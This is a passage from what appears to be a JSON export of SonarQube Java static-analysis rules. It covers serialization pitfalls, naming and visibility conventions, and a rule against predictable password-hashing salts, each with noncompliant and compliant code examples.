</li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2068","summary":"Hard-coded passwords are security-sensitive","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Non-static inner classes contain a reference to an instance of the outer class. Hence, serializing a non-static inner class will result in an\nattempt at serializing the outer class as well. If the outer class is not serializable, serialization will fail, resulting in a runtime error.</p>\n<p>Making the inner class <code>static</code> (i.e., \"nested\") avoids this problem, as no reference to an instance of the outer class is required.\nSerializing the inner class can be done independently of the outer class. Hence, inner classes implementing <code>Serializable</code> should be\n<code>static</code> if the outer class does not implement <code>Serializable</code>.</p>\n<p>Be aware of the semantic differences between an inner class and a nested one:</p>\n<ul>\n  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>\n  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Make the inner class <code>static</code> or make the outer class <code>Serializable</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Pomegranate {\n  // ...\n\n  public class Seed implements Serializable {  // Noncompliant, serialization will fail due to the outer class not being serializable\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Pomegranate {\n  // ...\n\n  public static class Seed implements Serializable { // Compliant, the outer class will not be serialized and hence cannot be the cause for a failure at runtime\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZTdGBQ\">CERT SER05-J.</a> - Do not serialize instances of inner classes </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2066","summary":"\"Serializable\" inner classes of non-serializable outer classes should be \"static\"","tags":["serialization","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Fields marked as <code>transient</code> in a <code>Serializable</code> class will be ignored during serialization and consequently not written out\nto a file (or stream).</p>\n<p>This can be useful in situations such as where the content of a field can be recomputed from other fields. To reduce the output size, this field\ncan be marked as <code>transient</code> and recomputed when a given object is deserialized.</p>\n<p>Since <code>transient</code> is very specific to classes that implement <code>Serializable</code>, it is superfluous in classes that do not.</p>\n<p>This rule raises an issue when a field is marked as <code>transient</code>, even though the containing class does not implement\n<code>Serializable</code>.</p>\n<h2>How to fix it</h2>\n<p>Ask yourself whether this class should be serializable. If yes, ensure it implements <code>Serializable</code> and provides any additional logic\nrequired to serialize and deserialize an instance of this type. Otherwise, remove the <code>transient</code> modifier from this field.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Vegetable {\n  private transient Season ripe; // Noncompliant, the \"Vegetable\" class does not implement \"Serializable\" but the field is marked as \"transient\"\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Vegetable {\n  private Season ripe; // Compliant, the field is not marked as \"transient\"\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-transient-keyword\">Baeldung - The transient Keyword in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2065","summary":"Fields in non-serializable classes should not be \"transient\"","tags":["serialization","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>A non-serializable <code>Comparator</code> can prevent an otherwise-<code>Serializable</code> ordered collection from being serializable. Since the\noverhead to make a <code>Comparator</code> serializable is usually low, doing so can be considered good defensive programming.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class FruitComparator implements Comparator&lt;Fruit&gt; {  // Noncompliant\n  int compare(Fruit f1, Fruit f2) {...}\n  boolean equals(Object obj) {...}\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class FruitComparator implements Comparator&lt;Fruit&gt;, Serializable {\n  private static final long serialVersionUID = 1;\n\n  int compare(Fruit f1, Fruit f2) {...}\n  boolean equals(Object obj) {...}\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2063","summary":"Comparators should be \"Serializable\"","tags":["serialization","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Developers may want to add some logic to handle deserialized objects before they are returned to the caller. This can be achieved by implementing\nthe <code>readResolve</code> method.</p>\n<p>Non-final classes implementing <code>readResolve</code> should not set its visibility to <code>private</code> as this would make it unavailable to\nchild classes. Instead, mark <code>readResolve</code> as <code>protected</code>, allowing it to be inherited.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Fruit implements Serializable {\n  private static final long serialVersionUID = 1;\n\n  private Object readResolve() throws ObjectStreamException // Noncompliant, `readResolve` should not be private\n  {...}\n\n  //...\n}\n\npublic class Raspberry extends Fruit implements Serializable { // This class has no access to the parent's \"readResolve\" method\n  //...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Fruit implements Serializable {\n  private static final long serialVersionUID = 1;\n\n  protected Object readResolve() throws ObjectStreamException // Compliant, `readResolve` is protected\n  {...}\n\n  //...\n}\n\npublic class Raspberry extends Fruit implements Serializable { // This class has access to the parent's \"readResolve\"\n  //...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/platform/serialization/spec/input.html#a5903\">Java Object Serialization Specification - Object\n  Input Classes</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2062","summary":"\"readResolve\" methods should be inheritable","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Java offers a built-in serialization mechanism for classes that implement the <code>Serializable</code> interface. The developer can either rely on\nJavaâs default serialization and deserialization logic or implement custom methods for these tasks. The JVM will use methods such as\n<code>readObject</code> and <code>writeObject</code> to execute custom behavior. This only works, however, if these methods match exactly the expected\nsignatures. If they do not, the JVM will fall back to the default logic, resulting in unexpected behavior at runtime, while the developer believes\nthat the default logic has been overidden.</p>\n<p>This rule raises an issue if an implementation of <code>writeObject</code>, <code>readObject</code>, <code>readObjectNoData</code>,\n<code>writeReplace</code>, or <code>readResolve</code> has an incorrect access modifier, return type, or is not static when it should be (and\nvice-versa).</p>\n<h2>How to fix it</h2>\n<p>Ensure that the serialization-related methodâs signatures match exactly those required by the JVM.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Watermelon implements Serializable {\n\n  void writeObject(java.io.ObjectOutputStream out)         // Noncompliant, \"writeObject\" needs to be private, which it is not here\n        throws IOException\n  {...}\n\n  static Object readResolve() throws ObjectStreamException // Noncompliant, \"readResolve\" should not be static\n  {...}\n\n  Watermelon writeReplace() throws ObjectStreamException   // Noncompliant, \"writeReplace\" must return \"java.lang.Object\"\n  {...}\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Watermelon implements Serializable {\n\n  private void writeObject(java.io.ObjectOutputStream out)    // Compliant, method declared as private\n        throws IOException\n  {...}\n\n  protected Object readResolve() throws ObjectStreamException // Compliant, method is not static\n  {...}\n\n  private Object writeReplace() throws ObjectStreamException  // Compliant, method returns \"java.lang.Object\"\n  {...}\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WTdGBQ\">CERT, SER01-J.</a> - Do not deviate from the proper signatures of serialization methods\n  </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/Serializable.html\">Oracle SDK - java.io.Serializable</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2061","summary":"Custom serialization methods should have required signatures","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A class that implements <code>java.io.Externalizable</code> is a class that provides a way to customize the serialization and deserialization,\nallowing greater control over how the objectâs state is written or read.</p>\n<p>The first step of the deserialization process is to call the class' no-argument constructor before the <code>readExternal(ObjectInput in)</code>\nmethod.</p>\n<p>An implicit default no-argument constructor exists on a class when no constructor is explicitly defined within the class. But this implicit\nconstructor does not exist when any constructor is explicitly defined, and in this case, we should always ensure that one of the constructors has\nno-argument.</p>\n<p>It is an issue if the implicit or explicit no-argument constructor is missing or not public, because the deserialization will fail and throw an\n<code>InvalidClassException: no valid constructor.</code>.</p>\n<h2>How to fix it</h2>\n<p>This issue can be fixed by:</p>\n<ul>\n  <li> Adding an explicit public no-argument constructor. </li>\n  <li> Or if all constructors can be removed, remove all constructors to benefit of the default implicit no-argument constructor. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Tomato implements Externalizable {\n\n  public Color color;\n\n  // Noncompliant; because of this constructor there is no implicit no-argument constructor,\n  // deserialization will fail\n  public Tomato(Color color) {\n    this.color = color;\n  }\n\n  @Override\n  public void writeExternal(ObjectOutput out) throws IOException {\n    out.writeUTF(color.name());\n  }\n\n  @Override\n  public void readExternal(ObjectInput in) throws IOException {\n    color = Color.valueOf(in.readUTF());\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Tomato implements Externalizable {\n\n  public Color color;\n\n  // Compliant; deserialization will invoke this public no-argument constructor\n  public Tomato() {\n    this.color = Color.UNKNOWN;\n  }\n\n  public Tomato(Color color) {\n    this.color = color;\n  }\n\n  @Override\n  public void writeExternal(ObjectOutput out) throws IOException {\n    out.writeUTF(color.name());\n  }\n\n  @Override\n  public void readExternal(ObjectInput in) throws IOException {\n    color = Color.valueOf(in.readUTF());\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/Externalizable.html\">Oracle SDK - java.io.Externalizable</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2060","summary":"\"Externalizable\" classes should have no-arguments constructors","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is actually\nserializable, then the serialization will succeed but possibly write out far more data than was intended.</p>\n<p>Making the inner class <code>static</code> (i.e. \"nested\") avoids this problem, therefore inner classes should be <code>static</code> if possible.\nHowever, you should be aware that there are semantic differences between an inner class and a nested one:</p>\n<ul>\n  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>\n  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Raspberry implements Serializable {\n  // ...\n\n  public class Drupelet implements Serializable {  // Noncompliant; output may be too large\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Raspberry implements Serializable {\n  // ...\n\n  public static class Drupelet implements Serializable {\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZTdGBQ\">CERT, SER05-J.</a> - Do not serialize instances of inner classes </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2059","summary":"\"Serializable\" inner classes of \"Serializable\" classes should be static","tags":["serialization","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>A <code>serialVersionUID</code> field is strongly recommended in all <code>Serializable</code> classes. If you do not provide one, one will be\ncalculated for you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an\nentirely new id, and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the\nclass.</p>\n<p><code>serialVersionUID</code>'s should be declared with all of these modifiers: <code>static final long</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Raspberry extends Fruit  // Noncompliant; no serialVersionUID.\n        implements Serializable {\n  private String variety;\n\n  public Raspberry(Season ripe, String variety) { ...}\n  public void setVariety(String variety) {...}\n  public String getVarity() {...}\n}\n\npublic class Raspberry extends Fruit\n        implements Serializable {\n  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Raspberry extends Fruit\n        implements Serializable {\n  private static final long serialVersionUID = 1;\n  private String variety;\n\n  public Raspberry(Season ripe, String variety) { ...}\n  public void setVariety(String variety) {...}\n  public String getVarity() {...}\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Records, Swing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and\n<code>Error</code>s), and classes marked with <code>@SuppressWarnings(\"serial\")</code> are ignored.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ajdGBQ\">CERT, SER00-J.</a> - Enable serialization compatibility during class evolution </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/16/docs/specs/serialization/serial-arch.html#serialization-of-records\">Record Serialization</a>\n  - Serialization of Records </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2057","summary":"\"Serializable\" classes should have a \"serialVersionUID\"","tags":["serialization","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Java serialization is the conversion from objects to byte streams for storage or transmission. And later, java deserialization is the reverse\nconversion, it reconstructs objects from byte streams.</p>\n<p>To make a java class serializable, this class should implement the <code>java.io.Serializable</code> interface directly or through its\ninheritance.</p>\n<pre>\nimport java.io.Serializable;\n\npublic class NonSerializableClass {\n}\n\npublic class SerializableClass implements Serializable {\n}\n\npublic class OtherSerializableClass extends SerializableClass {\n  // is also serializable because it is a subtype of Serializable\n}\n</pre>\n<p>Given a serializable class, it is important to note that not all its superclasses are serializable. Eventually, its superclasses stop implementing\n<code>java.io.Serializable</code>. It could be at the end, once reaching the <code>java.lang.Object</code> class, or before.</p>\n<p>This is important because the serialization/deserialization runs through the class hierarchy of an object to decide which object fields to write or\nread, and applies two different logics:</p>\n<ul>\n  <li> When the class is serializable:\n    <ul>\n      <li> Serialization saves the class reference and the object fields of this class. </li>\n      <li> Deserialization instantiates a new object of this class without using a constructor, and restores the object fields of this class. </li>\n    </ul>  </li>\n  <li> When the class is not serializable:\n    <ul>\n      <li> Serialization only saves the class reference and <strong>ignores</strong> the object fields of this class. </li>\n      <li> Deserialization instantiates a new object of this class using the <strong>no-argument constructor</strong> and does not restore the object\n      fields of this class. </li>\n    </ul>  </li>\n</ul>\n<p>So developers should pay particular attention to the non-serializable classes in the class hierarchy, because the presence of an implicit or\nexplicit <strong>no-argument constructor</strong> is required in those classes.</p>\n<p>This is an example of mandatory no-argument constructors in the hierarchy of <code>SerializableClass</code>:</p>\n<pre>\npublic class NonSerializableClassWithoutConstructor {\n  // after deserialization, \"field1\" will always be set to 42\n  private int field1 = 42;\n\n  // this non-serializable class has an implicit no-argument constructor\n}\n\npublic class NonSerializableClass extends NonSerializableClassWithoutConstructor {\n  // after deserialization, \"field2\" will always be set to 12 by the no-argument constructor\n  private int field2;\n\n  // this non-serializable class has an explicit no-argument constructor\n  public NonSerializableClass() {\n    field2 = 12;\n  }\n\n  public NonSerializableClass(int field2) {\n    this.field2 = field2;\n  }\n}\n\npublic class SerializableClass extends NonSerializableClass implements Serializable {\n  // after deserialization, \"field3\" will have the previously serialized value.\n  private int field3;\n\n  // deserialization does not use declared constructors\n  public SerializableClass(int field3) {\n    super(field3 * 2);\n    this.field3 = field3;\n  }\n}\n</pre>\n<p>Unfortunately, there is no compilation error when a class implements <code>java.io.Serializable</code> and extends a non-serializable superclass\nwithout a no-argument constructor. This is an issue because, at runtime, deserialization will fail to find the required constructor.</p>\n<p>For example, deserialization of an instance of the following <code>SerializableClass</code> class, throws an <code>InvalidClassException: no valid\nconstructor</code>.</p>\n<pre>\npublic class NonSerializableClass {\n  private int field;\n  // this class can not be deserialized because it does not have any implicit or explicit no-argument constructor\n  public NonSerializableClass(int field) {\n    this.field = field;\n  }\n}\n\npublic class SerializableClass extends NonSerializableClass implements Serializable {\n}\n</pre>\n<p>This rule checks in the hierarchy of serializable classes and reports an issue when a non-serializable superclass does not have the required\nno-argument constructor which will produce a runtime error.</p>\n<h2>How to fix it</h2>\n<p>There are two solutions to fix the missing <strong>no-argument constructor</strong> issue on non-serializable classes:</p>\n<ul>\n  <li> <code>Solution 1</code> If the fields of a non-serializable class need to be persisted, add the <code>java.io.Serializable</code> interface to\n  the class <code>implements</code> definition. </li>\n  <li> <code>Solution 2</code> Otherwise, add a no-argument constructor and initialize the fields with some valid default values. </li>\n</ul>\n<h3>Code examples</h3>\n<p><strong>Example #1</strong></p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n// Noncompliant; this Raspberry's ancestor doesn't have a no-argument constructor\n// this rule raises an issue on the Raspberry class declaration\npublic class Fruit {\n  private Season pickingSeason;\n  public Fruit(Season pickingSeason) {\n    this.pickingSeason = pickingSeason;\n  }\n}\n</pre>\n<pre>\npublic class Raspberry extends Fruit implements Serializable {\n  private static final long serialVersionUID = 1;\n  private String variety;\n  public Raspberry(String variety) {\n    super(Season.SUMMER);\n    this.variety = variety;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p><code>Solution 1</code></p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n// Compliant; this Raspberry's ancestor is serializable\npublic class Fruit implements Serializable {\n  private static final long serialVersionUID = 1;\n  private Season pickingSeason;\n  public Fruit(Season pickingSeason) {\n    this.pickingSeason = pickingSeason;\n  }\n}\n</pre>\n<p><strong>Example #2</strong></p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic class Fruit {\n  // Noncompliant; this Raspberry's ancestor doesn't have a no-argument constructor\n  // this rule raises an issue on the Raspberry class declaration\n  public Fruit(String debugMessage) {\n    LOG.debug(debugMessage);\n  }\n}\n</pre>\n<pre>\npublic class Raspberry extends Fruit implements Serializable {\n  private static final long serialVersionUID = 1;\n  private String variety;\n  public Raspberry(String variety) {\n    super(\"From Raspberry constructor\");\n    this.variety = variety;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p><code>Solution 2</code></p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic class Fruit {\n  // Compliant; this Raspberry ancestor has a no-argument constructor\n  public Fruit() {\n    this(\"From serialization\");\n  }\n  public Fruit(String debugMessage) {\n    LOG.debug(debugMessage);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/Serializable.html\">Oracle SDK - java.io.Serializable</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2055","summary":"The non-serializable super class of a \"Serializable\" class should have a no-argument constructor","tags":["serialization"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h3>Exceptions</h3>\n<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such\nfunctions are:</p>\n<ul>\n  <li> Argon2 </li>\n  <li> PBKDF2 </li>\n  <li> Scrypt </li>\n  <li> Bcrypt </li>\n</ul>\n<p>When they are used for password storage, using a secure, random salt is required.</p>\n<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those\ncases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed\nsalt is safe and accepted.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.spec.PBEParameterSpec;\n\npublic void hash() {\n    byte[] salt = \"salty\".getBytes();\n    PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.SecureRandom;\nimport javax.crypto.spec.PBEParameterSpec;\n\npublic void hash() {\n    SecureRandom random = new SecureRandom();\n    byte[] salt = new byte[32];\n    random.nextBytes(salt);\n\n    PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each userâs password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>\n<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the\n<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222542\">Application Security and\n  Development: V-222542</a> - The application must only store cryptographic representations of passwords. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2053","summary":"Password hashing functions should use an unpredictable salt","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Well-named functions can allow the users of your code to understand at a glance what to expect from the function - even before reading the\ndocumentation. Toward that end, methods returning a boolean should have names that start with \"is\" or \"has\" rather than with \"get\".</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic boolean getFoo() { // Noncompliant\n  // ...\n}\n\npublic boolean getBar(Bar c) { // Noncompliant\n  // ...\n}\n\npublic boolean testForBar(Bar c) { // Compliant - The method does not start by 'get'.\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic boolean isFoo() {\n  // ...\n}\n\npublic boolean hasBar(Bar c) {\n  // ...\n}\n\npublic boolean testForBar(Bar c) {\n  // ...\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Overriding methods are excluded.</p>\n<pre>\n@Override\npublic boolean getFoo(){\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2047","summary":"The names of methods with boolean return values should start with \"is\" or \"has\"","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you donât expect, and potentially leave it\nopen to unexpected modification by other classes.</p>\n<p>The default access level modifier may be intentional; in that case, this rule can report false positives.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Ball {\n  String color = \"red\";  // Noncompliant\n}\nenum A {\n  B;\n  int a;  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Ball {\n  private String color = \"red\";  // Compliant\n}\nenum A {\n  B;\n  private int a;  // Compliant\n}\n</pre>\n<h3>Exceptions</h3>\n<ul>\n  <li> Members with comments containing the word <code>modifier</code> are ignored, as it indicates the modifier is intentionally 